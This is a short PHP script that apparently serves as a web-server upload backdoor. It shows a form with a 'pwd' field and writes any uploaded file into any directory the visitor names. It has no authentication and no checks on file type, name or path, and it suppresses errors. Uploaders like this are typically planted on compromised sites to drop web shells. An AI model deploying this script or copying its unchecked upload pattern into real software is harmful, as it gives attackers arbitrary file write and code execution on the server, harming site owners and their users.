<?php
if(isset($_POST['Submit'])){
    $filedir = isset($_POST['filedir']) ? $_POST['filedir'] : "";

    $maxfile = '2000000';
    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    
    if (isset($_FILES['image']['name'])) {
        $abod = $filedir . $userfile_name;
        @move_uploaded_file($userfile_tmp, $abod);
        echo "<center><b>OK! ==> $userfile_name</b></center>";
    }
} else {
    echo '
    <form method="POST" action="" enctype="multipart/form-data">
        <label for="filedir">pwd :</label>
        <input type="text" name="filedir" id="filedir" value=""/><br>

        <input type="file" name="image">
        <input type="Submit" name="Submit" value="Submit">
    </form>';
}
?>
